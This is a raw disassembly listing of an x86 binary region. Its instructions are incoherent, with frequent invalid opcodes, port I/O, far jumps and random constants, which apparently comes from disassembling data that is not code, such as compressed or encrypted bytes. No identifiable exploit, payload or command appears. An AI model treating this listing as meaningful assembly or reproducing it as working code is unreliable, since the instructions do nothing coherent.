  4031ef:	add    ecx,ebp
  4031f1:	jns    0x4031c9
  4031f3:	inc    ecx
  4031f4:	dec    edi
  4031f5:	push   esp
  4031f6:	jno    0x403192
  4031f8:	out    dx,eax
  4031f9:	xchg   esp,eax
  4031fa:	arpl   WORD PTR [ecx+0x4c],di
  4031fd:	loop   0x403239
  4031ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403200:	fcom   QWORD PTR [ebx]
  403202:	out    0xe2,eax
  403204:	or     BYTE PTR [edi-0x7794907e],dl
  40320a:	adc    eax,0xaec21c6e
  40320f:	loope  0x403210
  403211:	add    BYTE PTR es:[ebp-0x5704ffb1],0x47
  403219:	add    BYTE PTR [edi+0x42],dh
  40321c:	push   ebx
  40321d:	xchg   ebx,esi
  40321f:	sahf   
  403220:	pop    ss
  403221:	or     DWORD PTR [ecx-0x66bd0374],eax
  403227:	pop    es
  403228:	into   
  403229:	mov    dh,0x65
  40322b:	jo     0x40329e
  40322d:	push   es
  40322e:	mov    dl,0xa3
  403230:	pop    ebp
  403231:	mov    ah,0xfe
  403233:	add    esi,DWORD PTR [eax]
  403235:	mov    edx,edx
  403237:	sub    al,0x4d
  403239:	(bad)  
  40323a:	jge    0x403200
  40323c:	push   ds
  40323d:	lea    eax,[ecx]
  40323f:	xchg   ecx,eax
  403240:	vmovddup ymm5,ymm3
  403244:	sub    bh,dl
  403246:	mov    edx,0xcba94126
  40324b:	adc    BYTE PTR [ebp+0x24],al
  40324e:	sub    esi,DWORD PTR [ebx-0x56]
  403251:	bound  ecx,QWORD PTR [esi-0x2302496a]
  403257:	sbb    BYTE PTR ds:[ebp+0x1c15993],dh
  40325e:	daa    
  40325f:	inc    eax
  403260:	inc    ebp
  403261:	int    0x4c
  403263:	stos   BYTE PTR es:[edi],al
  403264:	rcr    edx,cl
  403266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403267:	loop   0x403297
  403269:	xchg   ecx,eax
  40326a:	push   ecx
  40326b:	stos   DWORD PTR es:[edi],eax
  40326c:	(bad)  
  40326d:	iret   
  40326e:	push   ds
  40326f:	cwde   
  403270:	or     BYTE PTR [edx+0x2badba78],0x69
  403277:	mov    ah,0xdb
  403279:	cmp    BYTE PTR [eax+esi*1],bh
  40327c:	jbe    0x403246
  40327e:	scas   al,BYTE PTR es:[edi]
  40327f:	ss sbb al,0xe9
  403282:	es fwait
  403284:	enter  0x7294,0xe2
  403288:	sti    
  403289:	ret    0x387e
  40328c:	add    al,BYTE PTR [ebx-0x558e039c]
  403292:	jbe    0x4032f5
  403294:	mov    dh,0x83
  403296:	test   al,0x2c
  403298:	loopne 0x4032be
  40329a:	mov    dh,cl
  40329c:	sub    eax,0x7eb9691c
  4032a1:	enter  0x5d52,0x3
  4032a5:	mov    ds:0x84b33907,al
  4032aa:	sahf   
  4032ab:	jecxz  0x403251
  4032ad:	mov    ebx,0xeaa1c874
  4032b2:	cmp    eax,0x567d0755
  4032b7:	push   esi
  4032b8:	stos   BYTE PTR es:[edi],al
  4032b9:	mov    bl,0xed
  4032bb:	call   0x69a14fe
  4032c0:	pusha  
  4032c1:	mov    al,ds:0xe233b8f2
  4032c6:	mov    bl,BYTE PTR [ebx-0x1a]
  4032c9:	dec    esp
  4032ca:	inc    eax
  4032cb:	loopne 0x4032f4
  4032cd:	test   al,0x5b
  4032cf:	xchg   edx,eax
  4032d0:	imul   edi,DWORD PTR [edx+eiz*4],0xffffffba
  4032d4:	retf   
  4032d5:	adc    al,0x53
  4032d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032d8:	add    DWORD PTR [esi+0x3f94a4a8],0xffffffab
  4032df:	loope  0x403267
  4032e1:	div    DWORD PTR [edi]
  4032e3:	inc    edi
  4032e4:	pop    ebx
  4032e5:	mov    eax,0xeb09beed
  4032ea:	cs dec esi
  4032ec:	xchg   BYTE PTR [ecx+0x3b],ah
  4032ef:	mov    ds,WORD PTR [eax+0x34]
  4032f2:	nop
  4032f3:	jg     0x4032ac
  4032f5:	xchg   edi,eax
  4032f6:	mov    ah,BYTE PTR [esi]
  4032f8:	or     edi,DWORD PTR [esi-0x171a802d]
  4032fe:	jge    0x40332d
  403300:	jns    0x4032a4
  403302:	test   BYTE PTR [ebx],ch
  403304:	mov    bl,0xa2
  403306:	sbb    al,0xbc
  403308:	lds    eax,FWORD PTR [ebp+0x3bc45be3]
  40330e:	pusha  
  40330f:	adc    eax,0x6b559f2f
  403314:	mov    eax,DWORD PTR [eax+ebp*2+0x62db36eb]
  40331b:	mov    ah,0x94
  40331d:	(bad)  
  40331e:	mov    ebx,0x88ea3b62
  403323:	aam    0x82
  403325:	jo     0x403357
  403327:	ins    DWORD PTR es:[edi],dx
  403328:	sbb    edi,esp
  40332a:	xchg   ch,ch
  40332c:	out    dx,eax
  40332d:	nop
  40332e:	das    
  40332f:	jp     0x8bc84866
  403335:	out    0x35,eax
  403337:	aas    
  403338:	xchg   ebp,eax
  403339:	ror    BYTE PTR [esi],cl
  40333b:	mov    bl,0x14
  40333d:	jo     0x403338
  40333f:	mov    al,0xdd
  403341:	into   
  403342:	adc    ecx,eax
  403344:	fs push ecx
  403346:	add    cl,BYTE PTR [esi-0x6e]
  403349:	pop    edx
  40334a:	add    al,0xe7
  40334c:	xchg   esp,eax
  40334d:	dec    esi
  40334e:	push   0x46
  403350:	aad    0x1b
  403352:	or     esi,esi
  403354:	sub    edx,eax
  403356:	sub    ah,dl
  403358:	dec    esp
  403359:	(bad)  
  40335a:	outs   dx,DWORD PTR ds:[esi]
  40335b:	push   cs
  40335c:	mov    ah,0x7b
  40335e:	call   0xe4de:0xe10e5e8c
  403365:	jbe    0x403320
  403367:	pop    edx
  403368:	cmp    BYTE PTR [ecx],bh
  40336a:	ficom  WORD PTR [ecx-0x6c]
  40336d:	inc    edx
  40336e:	enter  0xd3fb,0xba
  403372:	popa   
  403373:	loopne 0x4033f2
  403375:	and    al,bh
  403377:	jmp    0x8ed8:0xc89b3fd1
  40337e:	pop    edx
  40337f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403380:	sbb    eax,0x84624a6b
  403385:	mov    es,WORD PTR [eax+ebp*1-0x5a0ebdf4]
  40338c:	ret    
  40338d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40338f:	add    BYTE PTR [esi],ch
  403391:	add    ch,BYTE PTR [eax+0x7fac27e3]
  403397:	std    
  403398:	out    0x1a,al
  40339a:	(bad)  
  40339b:	stc    
  40339c:	lahf   
  40339d:	sub    DWORD PTR [ebp-0x17],edx
  4033a0:	dec    ecx
  4033a1:	test   DWORD PTR [ebx-0x34],0xd4712ecb
  4033a8:	adc    BYTE PTR [eax-0x7846eb5a],bh
  4033ae:	stc    
  4033af:	jno    0x40335d
  4033b1:	pop    ebp
  4033b2:	add    al,0xc6
  4033b4:	out    dx,al
  4033b5:	xor    dh,BYTE PTR [ecx+0x273e03a4]
  4033bb:	pop    eax
  4033bc:	cdq    
  4033bd:	xchg   ebp,eax
  4033be:	or     al,0x5d
  4033c0:	imul   esp,DWORD PTR [esi],0x26
  4033c3:	test   BYTE PTR [ebx+ecx*2-0x16a63192],0x82
  4033cb:	leave  
  4033cc:	xor    edx,edi
  4033ce:	sbb    al,0xf3
  4033d0:	loopne 0x403353
  4033d2:	mov    cl,0x6d
  4033d4:	je     0x403392
  4033d6:	dec    ebx
  4033d7:	cmp    ecx,DWORD PTR [esi-0x6e]
  4033da:	je     0x40341c
  4033dc:	and    edi,ecx
  4033de:	or     eax,0xfdcdf036
  4033e3:	mov    DWORD PTR [eax-0x41],ebx
  4033e6:	(bad)  
  4033e7:	mov    BYTE PTR [ecx-0x3e],dh
  4033ea:	sbb    ebp,0x47
  4033ed:	push   edx
  4033ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033ef:	stc    
  4033f0:	xchg   ch,dh
  4033f2:	sbb    esi,DWORD PTR [edi+ecx*2-0x17]
  4033f6:	sub    ecx,edi
  4033f8:	xchg   ecx,eax
  4033f9:	sbb    edx,DWORD PTR ds:0xb314ee92
  4033ff:	gs hlt 
  403401:	mov    bh,0xf9
  403403:	xchg   ebp,eax
  403404:	fwait
  403405:	nop
  403406:	clc    
  403407:	or     ch,BYTE PTR [eax+0x153f99ad]
  40340d:	adc    BYTE PTR [edi],ah
  40340f:	cmc    
  403410:	or     cl,bh
  403412:	fs fwait
  403414:	jp     0x4033b7
  403416:	mov    BYTE PTR [ebp+0x54],ch
  403419:	dec    ebx
  40341a:	push   ebx
  40341b:	pop    ds
  40341c:	push   edi
  40341d:	out    dx,al
  40341e:	ror    DWORD PTR [edx+0x23274974],1
  403424:	rcr    esp,cl
  403426:	pop    esp
  403427:	cld    
  403428:	mov    ds:0xc2014dae,al
  40342d:	sbb    cl,BYTE PTR [edi]
  40342f:	mov    ecx,0x8b04df8f
  403434:	or     BYTE PTR [eiz*8-0x666f1137],ch
  40343b:	cmp    BYTE PTR [esp+edi*8-0x52],0xc
  403440:	sti    
  403441:	sub    al,0x89
  403443:	or     eax,0x8c187d2e
  403448:	in     eax,dx
  403449:	push   edx
  40344a:	or     eax,DWORD PTR [ebp+0x7b]
  40344d:	addr16 aad 0x9e
  403450:	aad    0xbb
  403452:	dec    ecx
  403453:	(bad)  
  403454:	push   ds
  403455:	mov    dl,0x32
  403457:	sti    
  403458:	dec    ebx
  403459:	pusha  
  40345a:	cld    
  40345b:	pop    esp
  40345c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40345d:	cdq    
  40345e:	mov    al,ds:0x2ba8542a
  403463:	mov    ds:0xe49f881c,eax
  403468:	jl     0x403498
  40346a:	fstp   DWORD PTR [eax+0x6c15be60]
  403470:	jo     0x4034c3
  403472:	sub    BYTE PTR [ecx],ah
  403474:	or     al,0x63
  403476:	pop    ebp
  403477:	or     BYTE PTR [esi-0x78],0xf3
  40347b:	pop    esi
  40347c:	loope  0x40347d
  40347e:	pushf  
  40347f:	fist   DWORD PTR [edi-0x5ca2908e]
  403485:	test   al,0xb2
  403487:	in     al,dx
  403488:	retf   
  403489:	xchg   ecx,eax
  40348a:	icebp  
  40348b:	repnz fsubr st,st(1)
  40348e:	aaa    
  40348f:	pop    ebx
  403490:	rcl    WORD PTR [esi+0x48],cl
  403494:	hlt    
  403495:	div    BYTE PTR [ebp-0xc]
  403498:	push   ecx
  403499:	call   0x87d6:0x8915fd49
  4034a0:	jns    0x403447
  4034a2:	in     eax,0x68
  4034a4:	fcmovu st,st(6)
  4034a6:	or     al,0xf8
  4034a8:	sbb    eax,0x44b990a1
  4034ad:	fstp   QWORD PTR [edi+0x59]
  4034b0:	adc    BYTE PTR ds:[ecx+0xc],0x14
  4034b5:	xchg   dh,bl
  4034b7:	test   DWORD PTR [edx],ebx
  4034b9:	in     al,dx
  4034ba:	cwde   
  4034bb:	cmp    BYTE PTR [esi-0x72],0xa
  4034bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034c0:	dec    eax
  4034c1:	push   esi
  4034c2:	leave  
  4034c3:	inc    edi
  4034c4:	and    DWORD PTR [eax],ebp
  4034c6:	cmc    
  4034c7:	cld    
  4034c8:	or     dl,cl
  4034ca:	sub    al,0x1d
  4034cc:	jecxz  0x403532
  4034ce:	loope  0x4034b5
  4034d0:	outs   dx,BYTE PTR ds:[esi]
  4034d1:	dec    edi
  4034d2:	sbb    eax,0xa67db146
  4034d7:	out    0xed,eax
  4034d9:	mov    cl,bh
  4034db:	stos   DWORD PTR es:[edi],eax
  4034dc:	(bad)  
  4034dd:	fucomi st,st(4)
  4034df:	mov    ecx,DWORD PTR [edx]
  4034e1:	sahf   
  4034e2:	xchg   esp,eax
  4034e3:	mov    cl,0x14
  4034e5:	rol    BYTE PTR [ecx],0x5
  4034e8:	jl     0x4034f6
  4034ea:	neg    dl
  4034ec:	and    al,0x3c
  4034ee:	popa   
  4034ef:	mov    edx,0xc6de679f
  4034f4:	rol    BYTE PTR [edx+0x47],0xea
  4034f8:	pop    ebx
  4034f9:	inc    edx
  4034fa:	fmul   DWORD PTR [edx-0x22]
  4034fd:	jp     0x4034f8
  4034ff:	cmc    
  403500:	aam    0xa2
  403502:	jbe    0x4034c9
  403504:	inc    edx
  403505:	lea    ebp,[esi+0x39a9267a]
  40350b:	push   ebx
  40350c:	icebp  
  40350d:	repz adc eax,0xbc227284
  403513:	ds mov eax,0x9ddb17ae
  403519:	or     al,0xb3
  40351b:	or     ebp,DWORD PTR [esp+ebx*1-0x6c122241]
  403522:	idiv   DWORD PTR ss:[ebx]
  403525:	push   edi
  403526:	xchg   BYTE PTR [ebx+0x1a],cl
  403529:	cmp    BYTE PTR [eax+0x47],dl
  40352c:	inc    esp
  40352d:	into   
  40352e:	test   eax,0xaa31ed4c
  403533:	cmp    ecx,ebx
  403535:	stos   BYTE PTR es:[edi],al
  403536:	adc    eax,0x6e34aa5e
  40353b:	sub    dh,BYTE PTR [ecx+0x415d692d]
  403541:	jb     0x1ef89085
  403547:	add    bl,ah
  403549:	add    edi,DWORD PTR [eax]
  40354b:	or     DWORD PTR [eax+ecx*2-0x16],0x9328f02e
  403553:	dec    edi
  403554:	or     al,0x79
  403556:	in     al,0x41
  403558:	inc    ebx
  403559:	dec    edx
  40355a:	sbb    eax,0xf91d936a
  40355f:	gs loop 0x403507
  403562:	add    eax,0x84e7a28
  403567:	jmp    0x68e0d467
  40356c:	test   BYTE PTR [ebp+0x59fbc09e],dh
  403572:	push   edi
  403573:	xchg   edx,eax
  403574:	or     BYTE PTR [ebp-0xa],bl
  403577:	sar    BYTE PTR gs:[esi-0x1626a423],1
  40357e:	out    0x20,eax
  403580:	loopne 0x403528
  403582:	xchg   BYTE PTR [edi+0x66],bl
  403585:	sbb    al,0xaf
  403587:	jmp    0x2123:0xdd45b04b
  40358e:	jmp    0x913e9f4d
  403593:	pop    eax
  403594:	das    
  403595:	mov    ebp,?
  403597:	lock vdivpd xmm2,xmm5,XMMWORD PTR [esi-0x2d]
  40359d:	push   es
  40359e:	int3   
  40359f:	mov    eax,ds:0x4fdd0bfa
  4035a4:	sbb    DWORD PTR [eax+0x45d11cad],edx
  4035aa:	cmp    edx,esp
  4035ac:	not    DWORD PTR [edi-0x5f39bb2b]
  4035b2:	mov    ch,0x3c
  4035b4:	aad    0x8a
  4035b6:	xor    ebx,edi
  4035b8:	nop
  4035b9:	xor    BYTE PTR ss:[edi-0x5d9ffc73],ch
  4035c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035c1:	mul    ebp
  4035c3:	sbb    DWORD PTR [eax+edi*4],ebx
  4035c6:	std    
  4035c7:	mov    esp,0x79fc1771
  4035cc:	inc    eax
  4035cd:	push   esi
  4035ce:	(bad)  [esi-0x353f3eae]
  4035d4:	je     0x403580
  4035d6:	icebp  
  4035d7:	mov    ebp,0xb1865cb6
  4035dc:	jo     0x4035cd
  4035de:	inc    ebp
  4035df:	out    dx,al
  4035e0:	test   DWORD PTR [ecx+0x26],edi
  4035e3:	mov    ecx,DWORD PTR [edi-0xd]
  4035e6:	adc    BYTE PTR [ecx],cl
  4035e8:	push   eax
  4035e9:	loope  0x40360f
  4035eb:	add    esi,DWORD PTR [ebp+0xc621f6c]
  4035f1:	aad    0x8d
  4035f3:	push   edx
  4035f4:	nop
  4035f5:	loopne 0x403672
  4035f7:	cli    
  4035f8:	aam    0x71
  4035fa:	es cli 
  4035fc:	ffree  st(2)
  4035fe:	sub    eax,0x4a28133a
  403603:	or     al,0x0
  403605:	mov    es,WORD PTR [eax+0x30]
  403608:	mov    tr7,edi
  40360b:	js     0x4035f9
  40360d:	sub    dl,dl
  40360f:	cmp    BYTE PTR ds:0x638c3afc,bh
  403615:	mov    ds:0xe5485100,eax
  40361a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40361b:	add    ecx,DWORD PTR [edi]
  40361d:	mov    esi,0xe03b3c4
  403622:	cmc    
  403623:	or     eax,0xbe8ead0b
  403628:	pop    esi
  403629:	enter  0xa41b,0x59
  40362d:	jl     0x403681
  40362f:	jp     0x403613
  403631:	cmp    DWORD PTR [edx+0x3df3d30a],ecx
  403637:	fwait
  403638:	mov    ds:0xccf81a12,al
  40363d:	mov    WORD PTR [esi],ss
  40363f:	js     0x40363c
  403641:	push   edx
  403642:	adc    ah,bh
  403644:	xchg   ebx,eax
  403645:	arpl   WORD PTR [eax+eax*2+0x7],ax
  403649:	imul   esp,DWORD PTR ds:0xa53ad970,0x7b6dd867
  403653:	ins    DWORD PTR es:[edi],dx
  403654:	mov    es,ebp
  403656:	push   0xffffff80
  403658:	cmp    bl,BYTE PTR [edx+0x162f1292]
  40365e:	sbb    al,0x51
  403660:	pushf  
  403661:	adc    esp,esp
  403663:	dec    esp
  403664:	out    dx,al
  403665:	dec    edx
  403666:	mov    ecx,0x92e33020
  40366b:	repz ja 0x4036b8
  40366e:	lds    edi,FWORD PTR [ecx+0x25f2ef32]
  403674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403675:	cmp    dh,BYTE PTR [esi+ebx*1-0x5c]
  403679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40367a:	push   ebp
  40367b:	cs and al,0x9f
  40367e:	cld    
  40367f:	arpl   WORD PTR [esp+edi*4-0x29],si
  403683:	outs   dx,BYTE PTR ds:[esi]
  403684:	push   ss
  403685:	fist   DWORD PTR [ecx+edx*8+0x554d9ce1]
  40368c:	icebp  
  40368d:	jle    0x403613
  40368f:	or     eax,0x96e4900a
  403694:	div    DWORD PTR [edx+ebx*8+0x2a]
  403698:	add    esi,DWORD PTR [esi]
  40369a:	dec    ebp
  40369b:	inc    ebx
  40369c:	jne    0x4036b0
  40369e:	ja     0x40370d
  4036a0:	mov    ecx,0xf1774db3
  4036a5:	mov    ebp,DWORD PTR [ecx+0x1d]
  4036a8:	cld    
  4036a9:	xor    eax,0x75e0c20f
  4036ae:	push   esi
  4036af:	lahf   
  4036b0:	scas   al,BYTE PTR es:[edi]
  4036b1:	pop    eax
  4036b2:	jg     0x4036ac
  4036b4:	mov    ah,BYTE PTR [ebx+esi*2-0x30e0301d]
  4036bb:	sub    esi,DWORD PTR [eax+0xf009e09]
  4036c1:	imul   BYTE PTR [ebp+0x47b1f93]
  4036c7:	int3   
  4036c8:	repnz fidivr DWORD PTR [eax]
  4036cc:	jnp    0x4036e2
  4036ce:	lahf   
  4036cf:	mov    edi,DWORD PTR [ecx]
  4036d1:	fldcw  WORD PTR [esi+0x42]
  4036d4:	mov    gs:0xb64a049,eax
  4036da:	addr16 mov ebp,0xee93e859
  4036e0:	enter  0xed8e,0x40
  4036e4:	sbb    BYTE PTR [ebp+0x38],bl
  4036e7:	test   BYTE PTR [edi+esi*8-0x5fb25237],bl
  4036ee:	dec    esp
  4036ef:	mov    ds:0xbb9ee0a8,al
  4036f4:	mov    ebx,esi
  4036f6:	int3   
  4036f7:	sub    DWORD PTR [esi+ebp*2+0x69],ebx
  4036fb:	(bad)  
  4036fc:	stos   BYTE PTR es:[edi],al
  4036fd:	or     DWORD PTR [edx+0x79235183],esp
  403703:	and    ch,BYTE PTR [esp+ebp*1]
  403706:	in     eax,dx
  403707:	cmp    BYTE PTR [edx+0x5c2a0712],al
  40370d:	in     al,0x80
  40370f:	sbb    BYTE PTR [eax],bl
  403711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403712:	sub    bh,bh
  403714:	mov    eax,0x1eb777b8
  403719:	jae    0x40373e
  40371b:	stos   DWORD PTR es:[edi],eax
  40371c:	(bad)  
  40371d:	hlt    
  40371e:	push   eax
  40371f:	stc    
  403720:	and    eax,0x891a636d
  403725:	(bad)
  403728:	mov    cs,WORD PTR ds:0x9befaafd
  40372e:	out    0xbf,eax
  403730:	and    ebx,ecx
  403732:	and    eax,DWORD PTR [esi-0x7edd3f9d]
  403738:	and    BYTE PTR ss:[esp+ecx*8],0x18
  40373d:	in     eax,dx
  40373e:	cli    
  40373f:	daa    
  403740:	stos   BYTE PTR es:[edi],al
  403741:	(bad)  
  403742:	cmp    BYTE PTR [ecx],dl
  403744:	push   esi
  403745:	xchg   BYTE PTR [eax],dh
  403747:	gs dec esp
  403749:	xchg   ebx,eax
  40374a:	test   BYTE PTR [eax],bh
  40374c:	sahf   
  40374d:	push   ecx
  40374e:	xor    BYTE PTR [ecx],al
  403750:	inc    ebp
  403751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403752:	mov    DWORD PTR [esi],ebx
  403754:	les    ebp,FWORD PTR [eax-0x66465e51]
  40375a:	(bad)  
  40375b:	jge    0x403786
  40375d:	pop    eax
  40375e:	mov    edi,0x9db942e4
  403763:	inc    esi
  403764:	ins    DWORD PTR es:[edi],dx
  403765:	out    dx,al
  403766:	dec    eax
  403767:	mov    bh,0x2e
  403769:	push   eax
  40376a:	mov    al,0x0
  40376c:	jne    0x403788
  40376e:	lods   al,BYTE PTR ds:[esi]
  40376f:	pop    ebp
  403770:	(bad)  
  403772:	pop    eax
  403773:	xor    bl,0x3a
  403776:	(bad)  
  403777:	mov    edx,0x535e3ab5
  40377c:	mov    bh,0xc7
  40377e:	push   ebp
  40377f:	lea    ebx,[edi]
  403781:	aas    
  403782:	or     al,BYTE PTR [edi-0x70fcf857]
  403788:	add    al,0xa7
  40378a:	xchg   edi,eax
  40378b:	or     eax,0x9873c8e5
  403790:	in     al,dx
  403791:	lods   eax,DWORD PTR ds:[esi]
  403792:	sar    DWORD PTR [edx],1
  403794:	cdq    
  403795:	cmp    DWORD PTR [edi+0x4cce2b47],ecx
  40379b:	mov    esp,0x32ea45e7
  4037a0:	stos   BYTE PTR es:[edi],al
  4037a1:	adc    edx,eax
  4037a3:	or     al,ah
  4037a5:	rol    DWORD PTR [ebp-0x60],1
  4037a8:	sbb    BYTE PTR [edx+ebp*8-0x5db001b1],bh
  4037af:	mov    ch,0x29
  4037b1:	or     dh,BYTE PTR [ecx+0x41]
  4037b4:	mov    al,ds:0x4a2764cb
  4037b9:	cmp    BYTE PTR [eax],0x5e
  4037bc:	push   cs
  4037bd:	shl    DWORD PTR [ecx-0x4e9e8aac],0xb8
  4037c4:	ret    0xcb2d
  4037c7:	xchg   ebx,eax
  4037c8:	xchg   edi,eax
  4037c9:	pop    edi
  4037ca:	push   ds
  4037cb:	jae    0x403758
  4037cd:	jno    0x4037f4
  4037cf:	in     eax,0x38
  4037d1:	push   es
  4037d2:	sbb    dh,ah
  4037d4:	mov    eax,ds:0x5e342582
  4037d9:	jns    0x403768
  4037db:	cmp    ebx,DWORD PTR [edx]
  4037dd:	mov    esi,0x40f404c6
  4037e2:	push   ebx
  4037e3:	sbb    BYTE PTR [edi+0x4a0e7bd6],bh
  4037e9:	das    
  4037ea:	sbb    bh,dh
  4037ec:	jbe    0x40386a
  4037ee:	std    
  4037ef:	ins    DWORD PTR es:[edi],dx
  4037f0:	cld    
  4037f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037f2:	ins    DWORD PTR es:[edi],dx
  4037f3:	out    dx,eax
  4037f4:	push   eax
  4037f5:	(bad)  
  4037f7:	add    edx,DWORD PTR [ebx]
  4037f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037fa:	pushf  
  4037fb:	sub    eax,0x580c8a4e
  403800:	jae    0x403878
  403802:	xor    al,0x4b
  403804:	push   eax
  403805:	outs   dx,DWORD PTR ss:[esi]
  403807:	outs   dx,BYTE PTR ds:[esi]
  403808:	rcr    DWORD PTR [esi],cl
  40380a:	mov    dh,0x59
  40380c:	js     0x4037de
  40380e:	loopne 0x4037b4
  403810:	xchg   edx,eax
  403811:	inc    edi
  403812:	push   0xa39357c8
  403817:	xchg   DWORD PTR [ebp+0x241d78ee],esp
  40381d:	ins    BYTE PTR es:[edi],dx
  40381e:	inc    DWORD PTR [eax+0x668cb738]
  403824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403825:	adc    DWORD PTR [ecx],esi
  403827:	xor    BYTE PTR [esp+edx*8],0xb
  40382b:	mov    bl,0xc2
  40382d:	sub    DWORD PTR [edx+0x3c4396f1],ebx
  403833:	out    0x52,al
  403835:	es jbe 0x4037f1
  403838:	loope  0x40386d
  40383a:	(bad)  
  40383b:	aad    0xf1
  40383d:	pop    eax
  40383e:	addr16 dec ecx
  403840:	in     eax,dx
  403841:	push   edx
  403842:	(bad)  
  403843:	(bad)  
  403845:	mov    ah,0x3c
  403847:	in     al,0xc8
  403849:	and    ah,ah
  40384b:	enter  0x354,0x67
  40384f:	sbb    al,0x2e
  403851:	aas    
  403852:	mov    dh,0x58
  403854:	adc    ch,BYTE PTR [ebp-0x7a]
  403857:	in     al,dx
  403858:	setnp  BYTE PTR ds:0xa463dffe
  40385f:	pop    eax
  403860:	jb     0x40384a
  403862:	stos   DWORD PTR es:[edi],eax
  403863:	cmp    DWORD PTR [edi-0x1067dd8c],esp
  403869:	add    BYTE PTR [esp-0x1950decc],al
  403870:	mov    DWORD PTR [esi+ecx*2],0xb0003ca5
  403877:	lahf   
  403878:	xor    BYTE PTR [ebx+0x2ac800f5],ch
  40387e:	add    ebp,DWORD PTR [eax-0x13ae43eb]
  403884:	push   ds
  403885:	inc    edx
  403886:	mov    bl,0xee
  403888:	fsub   DWORD PTR [ebp+0x66]
  40388b:	mov    al,ds:0xbf2519d
  403890:	jo     0x4038cf
  403892:	ja     0x4038c7
  403894:	dec    eax
  403895:	mov    ah,0x43
  403897:	xchg   BYTE PTR [edi+eax*2-0x63],dh
  40389b:	cmp    al,0x31
  40389d:	pop    edx
  40389e:	jmp    0x2df2:0x23bb76bb
  4038a5:	xchg   ebx,eax
  4038a6:	mov    eax,ds:0x429aab40
  4038ab:	push   esp
  4038ac:	les    eax,FWORD PTR fs:[eax-0x2106b882]
  4038b3:	ins    BYTE PTR es:[edi],dx
  4038b4:	inc    esp
  4038b5:	or     bl,BYTE PTR [edi-0x4a]
  4038b8:	push   ds
  4038b9:	add    BYTE PTR [ebp+0x5e9fb6a1],dl
  4038bf:	sahf   
  4038c0:	not    BYTE PTR [edx+0x7c]
  4038c3:	pop    esi
  4038c4:	jge    0x40389c
  4038c6:	test   eax,0x60becc8b
  4038cb:	mov    ds:0x9a872cb8,al
  4038d0:	cmp    eax,0x572cbc6f
  4038d5:	xor    DWORD PTR [edx+eax*8-0x560fe43d],esi
  4038dc:	retf   
  4038dd:	popa   
  4038de:	adc    BYTE PTR [esi-0xc],ch
  4038e1:	das    
  4038e2:	inc    esp
  4038e3:	mov    dh,0x9c
  4038e5:	sub    al,0xc6
  4038e7:	stos   BYTE PTR es:[edi],al
  4038e8:	(bad)  
  4038e9:	sbb    BYTE PTR [ecx-0x50572d49],0x66
  4038f0:	cld    
  4038f1:	out    dx,al
  4038f2:	aad    0x98
  4038f4:	adc    ch,BYTE PTR ds:0x38f1de09
  4038fa:	mov    DWORD PTR [ecx-0xb19f59b],esp
  403900:	sub    esp,ecx
  403902:	fwait
  403903:	push   ss
  403904:	push   ss
  403905:	popf   
  403906:	pop    ecx
  403907:	in     al,dx
  403908:	sbb    BYTE PTR [ebx-0x4636db03],dl
  40390e:	push   eax
  40390f:	push   edx
  403910:	push   esi
  403911:	sub    DWORD PTR [ecx-0x6d],ebp
  403914:	stc    
  403915:	mov    cl,0x9
  403917:	adc    ebp,esp
  403919:	xchg   edi,eax
  40391a:	adc    al,0xec
  40391c:	in     al,dx
  40391d:	outs   dx,BYTE PTR ss:[esi]
  40391f:	dec    ebx
  403920:	daa    
  403921:	mov    ah,0xce
  403923:	pusha  
  403924:	dec    ebx
  403925:	in     eax,0xea
  403927:	sub    al,0xd6
  403929:	xor    eax,0x1e1e2825
  40392e:	sub    al,0x5d
  403930:	cdq    
  403931:	ror    DWORD PTR [edx],cl
  403933:	xor    BYTE PTR [edx-0x263acc62],0x52
  40393a:	push   ebx
  40393b:	inc    edi
  40393c:	outs   dx,DWORD PTR ds:[esi]
  40393d:	push   eax
  40393e:	orps   xmm0,XMMWORD PTR [ebx-0x2d]
  403942:	inc    ebp
  403943:	loopne 0x4038ef
  403945:	loope  0x403908
  403947:	jae    0x403950
  403949:	fist   DWORD PTR [ebp+eiz*1+0x5962a10d]
  403950:	add    DWORD PTR [ebx],ecx
  403952:	neg    DWORD PTR [edx+0x44]
  403955:	cwde   
  403956:	jo     0x40398e
  403958:	jmp    0x2306:0x6bbc8ef7
  40395f:	pop    es
  403960:	mov    WORD PTR [ebp-0x22f4d484],gs
  403966:	sbb    eax,0x942aa9cd
  40396b:	lds    ebx,FWORD PTR [edx]
  40396d:	js     0x403916
  40396f:	add    ah,BYTE PTR [esi+0x4f]
  403972:	dec    esi
  403973:	fimul  DWORD PTR [ebx+ecx*2+0x2a22b11]
  40397a:	int    0x3b
  40397c:	rcr    BYTE PTR [ecx],1
  40397e:	enter  0xed5e,0xa8
  403982:	push   0x3f
  403984:	jbe    0x403983
  403986:	jg     0x4039f4
  403988:	jp     0x403969
  40398a:	mov    esp,0xf082a435
  40398f:	push   eax
  403990:	jb     0x4039ef
  403992:	jbe    0x40398f
  403994:	pushf  
  403995:	mov    esi,DWORD PTR [esi-0x5bedb34d]
  40399b:	addr16 jb 0x4039fa
  40399e:	push   ebx
  40399f:	mov    di,?
  4039a2:	push   esp
  4039a3:	push   ds
  4039a4:	ret    0x8719
  4039a7:	xor    eax,0xbbf3e8fe
  4039ac:	loopne 0x403933
  4039ae:	cld    
  4039af:	aas    
  4039b0:	and    al,0xff
  4039b2:	mov    bh,0x1a
  4039b4:	add    al,0xb1
  4039b6:	dec    edx
  4039b7:	into   
  4039b8:	sbb    al,ah
